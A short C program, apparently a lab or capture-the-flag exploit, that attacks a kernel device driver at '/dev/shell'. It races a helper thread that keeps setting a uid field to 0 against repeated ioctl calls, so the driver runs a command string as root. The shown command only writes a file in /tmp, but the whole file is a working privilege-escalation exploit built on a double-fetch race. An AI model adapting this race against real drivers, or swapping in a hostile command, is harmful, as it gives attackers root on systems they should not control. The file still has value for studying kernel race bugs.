#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <pthread.h>

#define IOCTL_DRIVER_NAME "/dev/shell"

int finish = 0;

typedef struct user_data {
	int	uid;
	char	cmd[100];
}  user_data;

void change_uid_root(void *s)
{
	user_data *s1 = s;

	while (finish == 0)
		s1->uid = 0;
}

int main(void)
{
	pthread_t thread_one;
	user_data udat;

	int fd = open(IOCTL_DRIVER_NAME, O_RDWR);

	if (fd == -1)
		exit(EXIT_FAILURE);

	memset(udat.cmd, 0, 100);

	udat.uid = 1000;

	strcpy(udat.cmd, "echo 'foo' > /tmp/hacker");

	pthread_create(&thread_one, NULL, change_uid_root, &udat);

	for (int i = 0; i < 100; i++) {
		ioctl(fd, 0, &udat);
		udat.uid = 1000;
	}

	finish = 1;
	pthread_join(thread_one, NULL);

	printf("finished\n");

	close(fd);

	return EXIT_SUCCESS;
}
